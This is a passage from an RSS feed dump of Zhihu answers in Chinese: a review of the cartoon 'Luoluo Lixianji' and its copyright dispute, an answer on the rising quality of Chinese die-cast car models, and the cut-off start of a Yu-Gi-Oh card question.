data-private-watermark-src=\"v2-e82b4f2162e1dd2f01fd4892f8e832ac\"></p>\n<p>这种有点痞痞的性格，再加上其强大的实力与其好看的机器身，人气高方才正常。</p>\n<p>其师父死（机车族人均死师父）后，其性格也越来越稳重。</p>\n<p>超音速，风雪之城城主，机车族第一高手。一开始因为师父风雪，而导致与其不和。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5a2400e5549075713476948af5e473be_720w.jpg?rss\" data-rawwidth=\"1433\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-5a2400e5549075713476948af5e473be\" data-watermark-src=\"v2-30d06b5e80bba1ca17c1a429fc7a2126\" data-private-watermark-src=\"v2-1b7b5f41a974341c89b64d27e3f29649\"></p>\n<p>不过暴龙神的到来，反倒帮其来解决这多年以来未曾解决掉一段恩怨，一段闪电与风雪多年前的恩怨。</p>\n<p><b>洛洛</b></p>\n<p>一个无意间闯入游戏世界的小孩，亦是一个爱玩游戏的小孩。来到异世界后，会有想家的情绪，也会迷茫，不过在一步步地成长。</p>\n<p>他会为了自己输给女生而生气，会有好胜心。</p>\n<p>一开始他无法理解霹雳火等所做所为，不明白何为“大丈夫有所不为，有所必为”。</p>\n<p>后来看到金铁兽救了自己的时候，我想洛洛在那里就知道了何为</p>\n<p>不过渐渐地接受了自己机战王的身份，并担起了机战王的责任。</p>\n<p>但机战王到底是怎么样的，谁也不知道，只能靠猜，大家说洛洛是就是。</p>\n<blockquote>洛洛：我实在也不是谦虚，我一个小孩子，怎么就当上了机战王呢。</blockquote>\n<p><br></p>\n<p><b>蓝毒兽</b></p>\n<blockquote>战争是一场肮脏的游戏，而我是更肮脏的玩家。</blockquote>\n<p>一个绝对的利己主义者，本剧最成功的反派，无论是剧中还是剧外。</p>\n<p>阴枭，从其名字形象到其技能，无一透露着一股冷冰冰的感觉.</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0d88d9d7dba4aa9b1118213250fec655_720w.jpg?rss\" data-rawwidth=\"745\" data-rawheight=\"555\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0d88d9d7dba4aa9b1118213250fec655\" data-watermark-src=\"v2-8fc91463e47b62e24e8986ec4c03353d\" data-private-watermark-src=\"v2-04a1c8ae4c838bec6fd5153f7c92500d\"></p>\n<p>小个子而又类似于一种蚁兽的外形，与其他机器人有一股截然不同的感觉，其名字与其手下名字紫毒兽，都透着一股奇怪的气息。</p>\n<p>幽冥音波功，这个技能是一个声音攻击，中招者会使自身能力下降。</p>\n<p>每次在屏幕上看到他，都会感觉到很危险。</p>\n<p>在能源之城离间闪电和风雪，让其兄弟反目成仇，虽然自己的部族也被灭了。</p>\n<p>投奔暴龙神，暴龙神便将其安插在猛虎王那里，猛虎王也心知蓝毒兽另有所图，但还是选择留下他，因为这样可以利用他。</p>\n<p>可惜最后还是被蓝毒兽反利用了。</p>\n<p>大决战前抢下时光之城的令牌，以令牌胁迫两个机战王下约定，约定永不侵犯蓝毒兽。</p>\n<p>一般这种小人，在其他少儿动画中，少年动画里，最后的结局都不会好，不是死也会是一种较为惨淡的结局，譬如发疯、脑残。但是《洛洛》里竟然让其逍遥法外，这是我没想到的，也许当年在电视机前看动画的人也没有几个人能想到。</p>\n<p><b>其它优点</b></p>\n<p>合体技能的设计很好，单打独斗斗不过，但是使用其合体技便能赢下。并且有相对应的克制关系，更为奇妙的是，机车族这一方一个合体技能克制猛兽族一方，而猛兽族这一方换一个对象即可打败机车族。如猛虎王对冲击波&amp;力霸天。</p>\n<p>除此之外，就是很帅，合体技能的动画很帅。</p>\n<p>除此之外，还有一招特殊的合体技——月色血风暴。</p>\n<p>最后月色血风暴的那招，真的是挺让年幼的我挺激动的。</p>\n<p>洛洛被逼入绝境，最后依照月亮的力量，使出最后的绝招“月色血风暴”，虽然仍是无特殊效果，不过在其剧情、背景音乐的角度下显得尤为激动人心。</p>\n<p>现在想想，月光即为HP这个挂还是过于强了，即使这个挂是有伏笔的，霹雳火和急先锋身上都一堆月亮元素，月神殿、时光之城、雷霆半月斩等等，还在霹雳火在第一次月光之下使出其雷霆半月斩。</p>\n<p><b>缺点</b></p>\n<p>整个世界都很奇怪，</p>\n<p>比如机器人是如何生产出来的？剧中没有解释。</p>\n<p>为何在机器人的世界里，洛洛一个碳基生物在这里却没有人感到奇怪。</p>\n<p>机器人是靠什么补充能量的？源源不断的能量是从何而来？</p>\n<p>风火轮一个机器人怎么会开一些私生子的玩笑？</p>\n<p>洛洛怎么从不会感到饥饿？</p>\n<p>……</p>\n<p>但是又不是很奇怪，因为这个世界的产生就很不正常，是人为制造出来的。</p>\n<p>一切都是由程序算法而做成的。</p>\n<p>还是得说下其它缺点，这部动画的缺点还是挺多的，很大一部分是源于钱，另一方面可以说是由于经验不足。</p>\n<p>最直观的是打斗画面，这是蓝弧第一部真正意义上的打斗动画，其动作设计约等于没有。都是简单走走走，放技能，而后在比力气。</p>\n<p>兼用卡太多，不过这个在后期改善了很多，前几集里，黑铁兽大军的那段，真的是一个接一个来重复。</p>\n<p>还有就是少儿作品的通病了吧，动画技能的变身过多，但是不变身的话总感觉缺了什么，因为本来就没什么好的动作设计，并且其技能特效也约等于没有，大多时候就在那时比力气……</p>\n<p>除此之外，一些情节，不得不降智。譬如《引蛇出洞》这一集，猛虎王刚受了伤，又明白急先锋不可能是只有一个人，并且他们很有可能练成了“流影电光闪”，如此草率追出去，明显地给猛虎王降智了。</p>\n<h3>重制</h3>\n<p>开头方面，由一个网瘾少年更改为一个电竞少年，缺乏了代入感以及共鸣感。</p>\n<p>《洛洛历险记》在当初能火，很大程度是因为同是相对普通的少年，利用现实世界中的游戏知识，在游戏世界里一步步成长，带领相对较弱的机车族一步步地能与其抗衡。</p>\n<p>在此期间，这部动画带了一个其名为爽感的情绪。</p>\n<p>而阵子看了一个问题“如何看待穿越小说中，一个普通人穿越后智商爆表，完爆几十岁的老狐狸？”， 下面 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/47ec72b16d39036ae7817992f4be8c4c\" data-hash=\"47ec72b16d39036ae7817992f4be8c4c\" data-hovercard=\"p$b$47ec72b16d39036ae7817992f4be8c4c\">@三叔侃侃</a> 的回答中指出两点爽文特征</p>\n<blockquote>\n<b>一、主人公起点不能过于夸张，否则缺乏代入感。</b><br><b>二、主人公必须在剧情过程中不断开启金手指和上帝视角，从而实现常人所不能。</b><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\" data-text=\"\" data-url=\"https://www.zhihu.com/question/376857581/answer/1834736238\">[3]</sup>\n</blockquote>\n<p>照此来看，洛洛历险记亦是一标准的穿越型小说，不过十岁的小毛孩可以与活了几百年的猛虎族斗智斗勇。</p>\n<p>不过，这不正是我当初喜欢《洛洛》的原因吗。</p>\n<h3>后续</h3>\n<p>《百变机兽之洛洛历险记》，从其名字可以看出，百变机兽肯定不止这么一部作品。是的，百变机兽是一个系列，并且除了《洛洛历险记》外，还有一系列后续作品。</p>\n<p>譬如《神龙拯救队之元气星魂》</p>\n<p><img src=\"https://pic4.zhimg.com/v2-14a89ea824b03746dde38108ad98d647_720w.jpg?rss\" data-rawwidth=\"1601\" data-rawheight=\"1000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-14a89ea824b03746dde38108ad98d647\" data-watermark-src=\"v2-248f6a0dee55cfef743e6c291078fc52\" data-private-watermark-src=\"v2-9526e133967ec51c84d19fe83ea89545\"></p>\n<p>《霹雳勇士之元气勇者》</p>\n<p><img src=\"https://pic4.zhimg.com/v2-67e04965964c8823d94f368d1e82cd6c_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-67e04965964c8823d94f368d1e82cd6c\" data-watermark-src=\"v2-d884db7aad409a2bf1404f52fe49a591\" data-private-watermark-src=\"v2-80ff6665f0cf06b41dbcc3cd2124cdc1\"></p>\n<p>以及《元气拯救队》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1670333acb6e687a8cae3fcd6854c111_720w.jpg?rss\" data-rawwidth=\"695\" data-rawheight=\"817\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1670333acb6e687a8cae3fcd6854c111\" data-watermark-src=\"v2-3b082e57819708e96a588a935c40504c\" data-private-watermark-src=\"v2-06a971ec71c74565467ef5057f09b277\"></p>\n<p>从其机器人外表来看，这三部都是百变机兽的系列作品，只不过世界观和制作公司与《洛洛》完全无关。</p>\n<p>这三部动画的制作均由星杰和湖南金鹰联合出品，星原进行制作的作品。</p>\n<p>至于为何不与蓝弧合作，我不清楚其内幕。明明二者的合作是属于互相成就，推测是二者对于版本的归属有了争议。</p>\n<p>以至于后来蓝弧和奥飞联合制作了重制版动画《武战道》，不过却被星杰告上法庭，最后于2018年宣判。</p>\n<blockquote>2018年4月20日，法院作出一审判决，认定《武战道》侵犯该剧著作权人的权利，酌情判令三被告（蓝弧动漫、蓝弧文化、奥飞）共同向该剧权利人王巍支付著作权使用费120万元。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"4\" data-text=\"\" data-url=\"https://baike.baidu.com/reference/8103125/4bec-P9AbeZ0Vakwoerm9kZcAnShQO88WNAJJ_hMYx2FbfGvAbZDfnTREgcVzsavmFPOUucErSwFQSF5hm3LIzm5Buw\">[4]</sup>\n</blockquote>\n<p>一个剧本拍出两部动画，谁侵权？</p>\n<p>我不大熟悉法律，将其判决放在此处，读者可自行评判。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-86159e9d9bbaa04ac951438852742417_720w.jpg?rss\" data-rawwidth=\"841\" data-rawheight=\"827\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-86159e9d9bbaa04ac951438852742417\" data-watermark-src=\"v2-1732b4298895f0d7c47608c6b48bcbc8\" data-private-watermark-src=\"v2-c75e88bac0dd4f2f978b31506a154c77\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b3edd5ce4627d8c861acde3af7131173_720w.jpg?rss\" data-rawwidth=\"866\" data-rawheight=\"826\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b3edd5ce4627d8c861acde3af7131173\" data-watermark-src=\"v2-6ae0e596892aa85d7d1357d0ef569d84\" data-private-watermark-src=\"v2-f341d3e7c0bf48e47f46ec2c11929a37\"></p>\n<p><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"5\" data-text=\"一个剧本拍出两部动画，谁侵权？\" data-url=\"https://gd.qq.com/a/20180419/029886.htm\">[5]</sup></p>\n<p>我对这个版权归属争议的看法很简单，即是遗憾。</p>\n<p>若是星杰仍继续与蓝弧合作，其后续至少比上述这些动画更有看头。</p>\n<p>可以出前传，前一任机战王的经历；亦可以出后续，最后机车族与猛兽族还是打了起来，因为最后仅仅只是洛洛和晶晶的矛盾解决，而机车族与猛兽族的根本矛盾从未解决，其根本矛盾即程序设计开始，便植入其根中的战斗设计。</p>\n<p>回到现实世界中，洛洛和晶晶仍在互相对战，一切又似乎回到了原点。</p>\n<p>但一切都在在2009年戛然而止，《洛洛历险记》最终还是没有其后续之作。</p>\n<h3>结语</h3>\n<p>其作品本身而言，一部有缺点，但是剧情优秀，人物刻画饱满的作品。</p>\n<p>一部奠定蓝弧风格的作品，自此，蓝弧完成了从制作日常动画变成了制作机甲动画的转换。</p>\n<p>也因这部动画而迈向其巅峰期，不过，五年后重制版折戟，使得蓝弧不得不再寻找转型之路。</p>\n<p>若仅仅也是折戟，亦还可接受，动画总会有成败，此时（2014）的蓝弧不再是五年前的小公司，此时已经拥有一定的经济实力，亦有相对应的抗压能力。此事带来其后果是，与星杰翻脸，并开始了官司之路。</p>\n<p>蓝弧此时可能未曾想到，它所面临的版权问题，仅仅只是开始。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-dac1ca748f8731f819837af7b4b3ca8e_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"558\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dac1ca748f8731f819837af7b4b3ca8e\" data-watermark-src=\"v2-b811c8b29f1413a2166c088d58a0530c\" data-private-watermark-src=\"v2-3c676be8309847a08e5f970f95ecdb4b\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jinl1874?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">道理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29003517?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价天元突破里的人物？</a><br><a href=\"http://www.zhihu.com/question/272101362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">那些动画形象贯穿你的童年？</a><br>\n","link":"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国的模型玩具制造水平达到了什么程度？","date":"2021-07-04 15:30:08","description":"\n<p>说说静态汽车模型吧，简直就是逆袭的典范。</p>\n<p>如果在 10 年前，国产汽车模型还是入门和低端的代名词。那个时候市面上主流的模型，诸如 AutoArt、京商、minichamps，1:18 模型在 500-1000 元的主流价位，1:43 模型在 100-300 左右的价位，做出了非常多经典的汽车模型，形态准确，细节丰富，可玩性也很出色。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7c11c70ad196a980bcfdee470c581725_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"852\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7c11c70ad196a980bcfdee470c581725\" data-watermark-src=\"v2-c8ec50de56be8017abd80e78642eec95\" data-private-watermark-src=\"v2-04a4c476ea895ec860d37592fe13e2a1\"></p>\n<p>比如图上这四台 1:43 的小比例模型，左1和右1是 AutoArt 全盛时期的作品，在不到 10cm 的小尺寸上实现了前轮转向，逼真的车灯细节。在 1:18 的大尺寸上，则有全部车门可开，方向盘车轮转件，内饰和后备箱植绒、独立的安全带扣甚至可动的后排中央扶手箱等等等丰富的细节。更是创造了无数如今难以企及的海景房车型，比如 AutoArt 的奔驰系列：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-83c2e969cf8846da4ed100f43ecad1b6_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，原作者：凌云壮志，侵删（这台是原厂版，仅前门能开）\" data-watermark=\"original\" data-original-src=\"v2-83c2e969cf8846da4ed100f43ecad1b6\" data-watermark-src=\"v2-17bc7df3ef0714be36b5121ac85e72d8\" data-private-watermark-src=\"v2-71723eb9500af1ec657a40ef866a8cdf\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3735704804765db5889039ec0f303b30_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，奔驰 280SE，原作者：Chelly，侵删\" data-watermark=\"original\" data-original-src=\"v2-3735704804765db5889039ec0f303b30\" data-watermark-src=\"v2-8645fdde68aaf78442e6c74ab8818ccd\" data-private-watermark-src=\"v2-42e683ed921ba4ff5c7815d543deac30\"></p>\n<p>如果你对以上产品没有什么概念，那我们一起看下同时代的国产模型翘楚，威力 Welly，产品在在 200-300 价位的 1:18 模型，是这样的： </p>\n<p><img src=\"https://pic3.zhimg.com/v2-23bfbf4ec5ede674b17714c5a5a2abd9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-23bfbf4ec5ede674b17714c5a5a2abd9\" data-watermark-src=\"v2-3e32084170a3a69f736c32875fc2ff63\" data-private-watermark-src=\"v2-378e2378e1e73e30ff2f8c8fc217b27d\"></p>\n<p>虽然已经有了相当不错的型准，但是整体做工相当粗糙，比如粗大且质感低劣的镀铬件，大灯中黑色的固定点，也就是传说中的死鱼眼，还有较弱的可玩性，这款大众 T1 似乎只有 2-3 个门可以开，而相近的舒克的模型，是这样的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-692cc8ff0f6ef8179ca940d131f32359_720w.jpg?rss\" data-rawwidth=\"1200\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"舒克的 T1，变态的全开展示，客运版甚至还有布艺的可动顶棚，图源：东西皇朝，已经好久没有听过这家店了\" data-watermark=\"original\" data-original-src=\"v2-692cc8ff0f6ef8179ca940d131f32359\" data-watermark-src=\"v2-95cbb12c2710378030647dafc371a290\" data-private-watermark-src=\"v2-3f0c2a26e78fbd95ec5a72adc8595779\"></p>\n<p>当然也有稍好一些的，比如威利的林肯领航员，型准、镀铬细节都进步很大，只是后门依旧不能开：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-13d921c3575cfa2d8e0c05e4f30104be_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"717\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-13d921c3575cfa2d8e0c05e4f30104be\" data-watermark-src=\"v2-da3ca76f33ba14ae7b7b9f0e7de5139f\" data-private-watermark-src=\"v2-f8f1a05106fd24ba539a82758b815905\"></p>\n<p>当然，还有一部分模型是可以做到 300-500 左右区间的原厂模型，可以做到全开门，不错的型准，后视镜、油箱盖等小细节可以动，但是差距依旧明显，比如漆面，相比成熟品牌会更容易起疹。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fdf6d41c395799367c82f04d235c705c_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fdf6d41c395799367c82f04d235c705c\" data-watermark-src=\"v2-51abdf291b1a91917a257f27ef8f9573\" data-private-watermark-src=\"v2-de872cf7ca173ab5aa00f510a527ebdb\"></p>\n<p> 这是十年前的情况，10 年间，整个静态模型的市场发生了翻天覆地的变化。整个世界范围内，似乎只有中国大陆对于这种大比例的静态模型还保持不错的兴趣和市场规模，其他市场合金静态模型市场快速萎缩，逐渐取而代之的是各种成本更低，形态效果更好，但是全封闭可玩性极低的树脂模型。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6f67128840dfcdb09e837dedbb39564e_720w.jpg?rss\" data-rawwidth=\"750\" data-rawheight=\"500\" data-size=\"normal\" data-caption=\"售价 1200 块的京商世纪树脂模型，内饰居然全是贴纸\" data-watermark=\"original\" data-original-src=\"v2-6f67128840dfcdb09e837dedbb39564e\" data-watermark-src=\"v2-67c7b2acb666bd9c6d8608724960bfed\" data-private-watermark-src=\"v2-6bf4d07a372ae7e18d3e166df2c874f5\"></p>\n<p>曾经在主流价位数一数二的巨头全部转向了其他的方向，迷你切和京商开始减少全开合金模型的开发，更多转向树脂材质，京商尚有劳斯莱斯幻影系列模型撑场，可以调整的座椅、中央扶手箱、后视镜、甚至独立的雨伞，做到巅峰的可玩性。可惜这款产品虽然在不断刷色，但是似乎依旧没有回本。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1d02a668fd20679b522ee531cf557437_720w.jpg?rss\" data-rawwidth=\"796\" data-rawheight=\"796\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1d02a668fd20679b522ee531cf557437\" data-watermark-src=\"v2-794148c736e988ea27da01daad94a8be\" data-private-watermark-src=\"v2-0f51947cf723ad069a74c5c6aef7936f\"></p>\n<p>迷你切的合金系列甚至开始出现无法做到全开的作品，退步相当大，比如奥迪 RS6 模型和复刻后不能开后备箱的银色 300SL。堪称耻辱，现在更是玩上了合金龟车。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6b6220b91706ae21e3bccd405e35bddd_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-6b6220b91706ae21e3bccd405e35bddd\" data-watermark-src=\"v2-14a6154e108378d9f46daecd38dfa375\" data-private-watermark-src=\"v2-206f0e04ca7a080b4acd9c34aa8755c6\"></p>\n<p>AutoArt 倒是一直坚持在高品质全开门模型上，但是材质从锌合金转变为复合材质，说人话就是，有了更多塑料材料的成分在，售价也逐渐涨到 1000 甚至 1500 以上，并复刻了不少曾经的经典车型，比如捷豹 E-Type。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c72719d872a2292d3774b9b2bc0ad1ef_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c72719d872a2292d3774b9b2bc0ad1ef\" data-watermark-src=\"v2-11fc85857100ff0d9f9f3b18ce44df97\" data-private-watermark-src=\"v2-3561dc3245e980fb86eaf02933ea956e\"></p>\n<p>而在大陆这篇目前最为繁茂的成品合金模型市场上，又有广东这个曾经几乎主流品牌都有代工厂的所在地，目前的国产模型已经是这个样子了：</p>\n<p>首先是因为知名大 V 许群加入而知名度极高的 Almost Real，起点就相当高，1000 元出头的路虎系列和奔驰迈巴赫系列，做出了相当丰富的细节、可动件，这在除了 AA 以外的主流价位海外品牌身上已经许久没有看到了，如今产品价格也冲向了 1500 以上更高的区间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7de9e6847d3f5d1bc2f2d796ef195208_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1149\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7de9e6847d3f5d1bc2f2d796ef195208\" data-watermark-src=\"v2-a802de625c91351837198f43cf8c7a09\" data-private-watermark-src=\"v2-f466467d0e34c3eb2dccf60e12c0c555\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f846442c0f1046649c9d21bb991baf9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"1140\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1f846442c0f1046649c9d21bb991baf9\" data-watermark-src=\"v2-e95b9757651ede083ec0449bddcb0d3e\" data-private-watermark-src=\"v2-a53f2529a9c4d7b360620a8ff2289c81\"></p>\n<p>世纪龙也是近两年异军突起的一个新兴品牌，这家总部设在香港的模型品牌是做红旗模型最好的牌子，在不到千元的价格里把红旗还原到极致。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-993b98096c38c2c04619e27508e658f2_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"854\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-993b98096c38c2c04619e27508e658f2\" data-watermark-src=\"v2-e635b12e316d809e9c85f4bf4196e81e\" data-private-watermark-src=\"v2-ca4d719a5904c1c62ebd0d79840dcae7\"></p>\n<p>然后是小光最新的 1:18 凯迪拉克 Fleetwood：同样全开模型，美式豪华车的大皮革沙发细节，中网的镂空，展现的淋漓尽致，价格也达到了 1350 元。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c384a64b33065af7fc53589d040d958a_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-c384a64b33065af7fc53589d040d958a\" data-watermark-src=\"v2-bfbc21c19f05c6014b938a79c36b02d1\" data-private-watermark-src=\"v2-35366950f29d3ac8538fda73724049b6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-096925c6cd2e414c3b05415284768a7d_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"375\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-096925c6cd2e414c3b05415284768a7d\" data-watermark-src=\"v2-a3be635d5c732547b487a401e7473449\" data-private-watermark-src=\"v2-4831629998746d64a157f7bd6a25a598\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4d0f278c00f9b59a4313bb6e80583948_720w.jpg?rss\" data-rawwidth=\"975\" data-rawheight=\"975\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-4d0f278c00f9b59a4313bb6e80583948\" data-watermark-src=\"v2-532be36521a266bea25833b7024f99de\" data-private-watermark-src=\"v2-afcceadbd5988fed39e5ab03076253ed\"></p>\n<p>其辉虽然和其他品牌比起来有些弱，但是在 1000 元左右也有立得住脚的产品，比如堪称 CMC 平替的普尔曼，相比 CMC 4000 多的售价，其辉用 1600 元做出了八成功力，也是相当不错的选择。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8dc3c9f5c3ec4b10cae340198fd08049_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"481\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-8dc3c9f5c3ec4b10cae340198fd08049\" data-watermark-src=\"v2-b365658a7116b1620df1b979da6162a6\" data-private-watermark-src=\"v2-b0c09efb5d3cc3ee6c2225c58042e511\"></p>\n<p>如今国产模型已经冲刺到较高端的主流市场，同时收到了市场的认可。这些品牌能和 AA 能打的有来有回，虽然 Almost Real  因为收藏路线问题一直没有收，Fleetwood 已经是确定要入的了，至于其辉，我已经有 CMC 了，再买问题就在房子不在模型了……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6_720w.jpg?rss\" data-rawwidth=\"1620\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-a43c1be4bb9e3d44d36bae2dbcfe7ad6\" data-watermark-src=\"v2-7caa3d6d6c831a8c6d6fd5c8ffeb46b2\" data-private-watermark-src=\"v2-14e834606ccda55a7f30693466ecd654\"></p>\n<p><br></p>\n<hr>\n<p>刚好今天瞅见了，给你们看看曾经的国际大厂如今复刻老车型有多对付，minichamps 新的 E34，倒是六门可开，没想到这个前后死鱼眼分毫不改，同时淘宝售价 1200，累了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6aa7653408047b570fc30804512448e3_720w.jpeg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-6aa7653408047b570fc30804512448e3\" data-watermark-src=\"v2-e56549901bea2040316c75c1372f9d17\" data-private-watermark-src=\"v2-87fcb7bac50607f1804f28d4efb5a83f\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-58b01411a27dbb127a6e38a43cfa5f22_720w.jpeg?rss\" data-rawwidth=\"1500\" data-rawheight=\"1000\" data-size=\"normal\" data-watermark=\"original\" data-original-src=\"v2-58b01411a27dbb127a6e38a43cfa5f22\" data-watermark-src=\"v2-29ee68c98fef615ed596d21385d49041\" data-private-watermark-src=\"v2-2dfae0822b9fbf62b04d35d7c644457d\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mo-fu-ping-sheng-zhi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">逐行扫描</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">275 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265589988?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想找一个拼装玩具？</a><br><a href=\"http://www.zhihu.com/question/268619884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小孩子经常打扰我工作，有什么方法或者玩具车能让他安静的呆一边玩去？</a><br>\n","link":"http://www.zhihu.com/question/40669780/answer/1978083632?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"《游戏王》中真红眼黑龙为什么被称为顶级卡片？","date":"2021-07-02 15:30:09","description":"\n<p>题主的问题，在原作中真红眼黑龙出场的第一页交代清楚了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-de8496b166a074c4d842b8f8ba9b40f3_720w.jpg?rss\" data-rawwidth=\"1965\" data-rawheight=\"1500\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-de8496b166a074c4d842b8f8ba9b40f3\" data-watermark-src=\"v2-99b51489d7eaf9cfd7fd7cea5b43ef36\" 